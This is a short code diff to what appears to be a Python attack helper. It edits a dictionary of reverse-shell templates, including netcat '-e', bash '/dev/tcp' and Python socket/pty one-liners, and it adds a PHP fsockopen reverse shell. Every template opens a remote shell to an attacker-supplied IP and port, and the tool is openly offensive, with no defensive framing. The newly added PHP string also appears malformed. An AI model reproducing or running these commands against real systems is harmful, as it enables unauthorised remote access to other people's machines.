@@ -22,7 +22,8 @@ buildPrompt = lambda options, prompt: \
 reverseShellTemplates = {
 	"netcat": "nc (ip) (port) -e (sh)",
 	"bash": "bash -i >& /dev/tcp/(ip)/(port) 0>&1",
-	"python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"(ip)\",(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"(sh)\")'"
+	"python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"(ip)\",(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"(sh)\")'",
+	"php": "php -r '$sock=fsockopen(\"(ip)\",(port));exec(\"/bin/bash -i <&3 >&3 2>&3\");" # Credits: http://github.com/rhergenreder/HackingScripts/
 }
 
 menu = buildPrompt([
